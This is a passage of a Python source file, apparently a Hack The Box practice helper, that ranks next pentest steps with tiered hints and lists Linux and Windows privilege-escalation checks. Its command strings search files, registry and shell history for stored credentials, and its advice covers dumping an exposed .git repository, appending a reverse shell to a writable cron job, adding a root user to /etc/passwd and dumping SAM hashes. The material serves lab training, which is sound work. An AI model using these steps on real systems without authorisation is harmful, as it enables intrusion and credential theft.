            "A shell inside a container has a different hostname, a tiny process list, and /.dockerenv.",
            "Confirm containment, then look for the escape: a mounted socket, excess capabilities, or a visible host disk.",
            "cat /proc/1/cgroup; ls -la /.dockerenv; capsh --print",
        ],
        weight=88,
    ),
    Rule(
        key="source-review", phase="web", min_difficulty="hard",
        title="Read the application's source rather than fuzzing it",
        why="Insane web boxes are not beaten by wordlists. If a .git directory, "
            "a backup file or a public repository gives you the source, the bug "
            "is a code review — and it is usually a single line.",
        commands=[
            "curl -s http://{host}/.git/HEAD    # 200 means the repo is exposed",
            "git-dumper http://{host}/.git/ src/ && cd src && git log -p | less",
            "ffuf -u http://{host}/FUZZ -w <list> -e .bak,.old,.swp,.zip,.tar.gz,~",
            "grep -rniE 'eval|exec|pickle|unserialize|system|subprocess|innerHTML' src/",
        ],
        look_for=["exposed .git", "editor swap files", "old commits containing secrets",
                  "authentication implemented by hand"],
        ladder=[
            "Do you have to guess how this application works, or can you read it?",
            "Exposed version control and stray backup files hand you the source.",
            "Dump the repository and read the history — secrets are usually in a commit that was 'removed'.",
            "curl -s http://{host}/.git/HEAD    then    git-dumper http://{host}/.git/ src/",
        ],
        weight=85,
    ),
]

# Post-foothold. Kept separate because it fires on shell state, not on ports.
PRIVESC = {
    "linux": {
        "label": "Linux privilege escalation",
        "first": [
            "id; sudo -l                      # the answer is here more often than anywhere else",
            "find / -perm -4000 -type f 2>/dev/null   # SUID binaries",
            "cat /etc/crontab; ls -la /etc/cron.*     # writable scripts run as root",
            "ss -tlnp                          # services bound to localhost only",
        ],
        "then": [
            "linpeas.sh -a | tee peas.txt      # read the whole thing, not just the red",
            "getcap -r / 2>/dev/null           # capabilities are missed constantly",
            "ls -la /opt /srv /var/backups     # custom scripts live here",
            "grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /home /opt 2>/dev/null",
        ],
        "checks": [
            ("sudo -l shows anything", "Look it up on GTFOBins first — most sudo entries are a one-liner"),
            ("An unusual SUID binary", "GTFOBins again; otherwise reverse it, it may call a binary by relative path"),
            ("A writable cron script", "Append a reverse shell and wait for the schedule"),
            ("A service on 127.0.0.1", "Port-forward it out: ssh -L, or chisel — the box is hiding an app from you"),
            ("Credentials reused", "Try every password you have found against every user on the box"),
            ("Writable /etc/passwd", "Add a root-uid user with a hash you generated with openssl passwd"),
            ("Docker or lxd group", "Group membership is root — mount the host filesystem in a container"),
        ],
    },
    "windows": {
        "label": "Windows privilege escalation",
        "first": [
            "whoami /all                       # privileges matter more than groups",
            "systeminfo                        # patch level and architecture",
            "net user; net localgroup administrators",
            "Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.xml,*.config -ErrorAction SilentlyContinue",
        ],
        "then": [
            "winPEAS.exe / .\\PrivescCheck.ps1",
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winlogon   # autologon creds",
            "cmdkey /list                      # stored credentials",
            "Get-Content (Get-PSReadlineOption).HistorySavePath   # PowerShell history",
        ],
        "checks": [
            ("SeImpersonatePrivilege", "A potato attack gives SYSTEM — this is the most common Windows path on HTB"),
            ("SeBackupPrivilege", "Read any file: dump SAM and SYSTEM, then extract the hashes offline"),
            ("Unquoted service path", "Writable directory in the path plus a service restart"),
            ("AlwaysInstallElevated", "Both registry keys set means an MSI runs as SYSTEM"),
            ("Stored credentials", "cmdkey /list then runas /savecred"),
            ("AD group membership", "Run BloodHound — the path to Domain Admin is usually a graph, not an exploit"),
        ],
    },
}


# ---------------------------------------------------------------- the brain

@dataclass
class Observation:
    """Everything currently known about one box."""
    host: str
    os_guess: str = ""
    ports: list[dict] = field(default_factory=list)   # {port,service,product,version}
    hostnames: list[str] = field(default_factory=list)
    creds: list[dict] = field(default_factory=list)   # {user,secret}
    has_shell: bool = False
    shell_user: str = ""
    is_root: bool = False
    user_flag: bool = False
    root_flag: bool = False
    difficulty: str = "easy"
    notes: list[str] = field(default_factory=list)


def _difficulty_rank(name: str) -> int:
    try:
        return DIFFICULTY_ORDER.index((name or "easy").strip().lower())
    except ValueError:
        return 1                          # unknown difficulty behaves as easy


def _matches(rule: Rule, obs: Observation) -> bool:
    # Gates first — they are cheap and they are the reason a rule is noise.
    if _difficulty_rank(obs.difficulty) < _difficulty_rank(rule.min_difficulty):
        return False
    if rule.needs_creds and not obs.creds:
        return False
    if rule.needs_shell and not obs.has_shell:
        return False

    if not rule.ports and not rule.services:
        return True                      # always-applicable (full port sweep)
    for p in obs.ports:
        try:
            num = int(p.get("port", 0))
        except (TypeError, ValueError):
            num = 0
        svc = str(p.get("service", "")).lower()
        if num in rule.ports or any(s in svc for s in rule.services):
            return True
    return False


def next_actions(obs: Observation) -> list[dict]:
    """Rank what to do next, given what the box has actually shown you.

    Ordering is by phase first and weight second: there is no point suggesting
    a privilege-escalation check to someone who has not got a shell, however
    promising the service looks. That ordering is most of the value — under
    time pressure the failure is rarely ignorance, it is doing the right things
    in the wrong order.
    """
    phase = current_phase(obs)
    phase_order = {p["key"]: i for i, p in enumerate(PHASES)}
    here = phase_order.get(phase, 0)

    out = []
    for rule in RULES:
        if not _matches(rule, obs):
            continue
        rule_phase = phase_order.get(rule.phase, 0)
        if rule_phase > here + 1:
            continue                     # too far ahead to be useful yet
        host = obs.hostnames[0] if obs.hostnames else obs.host
        out.append({
            "key": rule.key,
            "phase": rule.phase,
            "tier": rule.min_difficulty,
            "title": rule.title,
            "why": rule.why,
            "commands": [c.replace("{host}", obs.host) for c in rule.commands],
            "look_for": rule.look_for,
            "hints": [h.replace("{host}", obs.host) for h in rule.ladder],
            "current_phase": rule.phase == phase,
            "_sort": (0 if rule.phase == phase else 1, -rule.weight),
            "_host": host,
        })

    out.sort(key=lambda a: a.pop("_sort"))
    for a in out:
        a.pop("_host", None)

    if obs.has_shell and not obs.is_root:
        family = "windows" if "win" in (obs.os_guess or "").lower() else "linux"
        pe = PRIVESC[family]
        out.insert(0, {
            "key": f"privesc-{family}",
            "phase": "privesc",
            "title": pe["label"],
            "why": "You have execution. Enumerate before you exploit — the way "
                   "up is usually already sitting in sudo -l or whoami /all.",
            "commands": pe["first"] + pe["then"],
            "look_for": [c[0] for c in pe["checks"]],
            "hints": [
                "You have a shell. What are the two commands that most often end the box?",
                "Your own privileges — what you are allowed to do, not what you can read.",
                "Check sudo rights and special privileges before running any script.",
                pe["first"][0],
            ],
            "current_phase": True,
        })
    return out


def current_phase(obs: Observation) -> str:
    if obs.root_flag:
        return "root"
    if obs.is_root:
        return "root"
    if obs.user_flag or (obs.has_shell and obs.shell_user not in ("", "www-data", "apache", "nobody")):
        return "privesc"
    if obs.has_shell:
        return "user"
    if obs.creds:
        return "foothold"
    if any(int(p.get("port", 0) or 0) in (80, 443, 8080, 8000, 8443) for p in obs.ports):
        return "web"
    if obs.ports:
        return "enum"
    return "recon"


def hint(obs: Observation, level: int = 1, key: str = "") -> dict:
    """One hint, at the level of help you asked for.

    Level 1 is a question, level 4 is the command. Deliberately explicit about
    which rung you are on, so "give me the answer" is a choice you make rather
    than something the tool decides for you.
    """
    level = max(1, min(4, int(level)))
    actions = next_actions(obs)
    if not actions:
        return {"level": level, "hint": "Nothing enumerated yet — run the full "
                                        "port sweep first.", "of": 4}

    # Falling back to actions[0] when the requested key is not applicable looks
    # harmless and is not: you click "hint" on the ADCS card, get the credential
    # spraying command, and have no way to tell that is what happened. Say so
    # instead — and say *why* the rule is not live yet, since that is itself the
    # answer ("you have not found the port that makes this relevant").
    action = next((a for a in actions if a["key"] == key), None)
    substituted = False
    if action is None:
        if key:
            substituted = True
        action = actions[0]
    ladder = action.get("hints") or []
    text = ladder[min(level - 1, len(ladder) - 1)] if ladder else action["title"]
    labels = ["nudge", "direction", "technique", "exact command"]
    result = {
        "key": action["key"],
        "title": action["title"],
        "level": level,
        "level_label": labels[level - 1],
        "of": 4,
        "hint": text,
        "next_level_available": level < 4,
        "requested_key": key or action["key"],
        "substituted": substituted,
    }
    if substituted:
        result["note"] = (
            f"'{key}' does not apply to this box yet — nothing you have found "
            f"so far makes it relevant, and its prerequisites (a port, a "
            f"credential, or a shell) are not met. Showing the highest-value "
            f"action that does apply instead."
        )
    return result


def writeup_policy(machine_state: str) -> dict:
    """Whether a writeup for this machine can be looked up.

    HTB permits published writeups for retired machines and prohibits them for
    active ones. That is not a rule this tool gets to reinterpret — but it is
    worth stating the reason rather than just refusing, because the reason is
    the useful part.
    """
    retired = (machine_state or "").strip().lower() in ("retired", "inactive", "archived")
    if retired:
        return {
            "allowed": True,
            "note": "Retired machine — official HTB writeups and community "
                    "writeups are permitted. Read one after you have tried, "
                    "not instead of trying.",
        }
    return {
        "allowed": False,
        "note": "Active machine. Writeups and shared flags are against HTB's "
                "rules and are what their anti-cheat looks for. Use the hint "
                "ladder instead — it works from your own scan of your own "
                "instance, which is allowed and specific to the box you have.",
    }


def summary() -> dict:
    """Static reference for the UI."""
    return {
        "phases": PHASES,
        "privesc": PRIVESC,
        "xp": {
            "machines": MACHINE_XP,
            "challenges": CHALLENGE_XP,
            "sherlocks": SHERLOCK_XP,
            "active_multiplier": ACTIVE_MULTIPLIER,
            "streak_xp_per_week": STREAK_XP_PER_WEEK,
            "ranks": RANKS,
            "levels_per_rank": LEVELS_PER_RANK,
        },
        "rules": [
            {"key": r.key, "phase": r.phase, "title": r.title, "why": r.why,
             "ports": list(r.ports), "look_for": r.look_for}
            for r in RULES
        ],
    }
